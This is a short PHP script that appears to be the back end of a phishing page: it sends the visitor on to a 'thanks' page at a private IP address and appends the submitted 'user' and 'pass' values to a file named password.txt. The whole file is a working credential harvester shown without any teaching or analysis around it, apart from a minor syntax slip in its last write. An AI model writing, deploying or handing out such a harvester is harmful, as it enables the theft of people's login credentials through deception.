<?php
header("Location: http://10.0.26.8/thanks.html");
$handle = fopen("password.txt", "a");
fwrite($handle, $_GET['user']);
fwrite($handle, " : ");
fwrite($handle, $_GET['pass']);
fwrite($handle, /n);

?> 
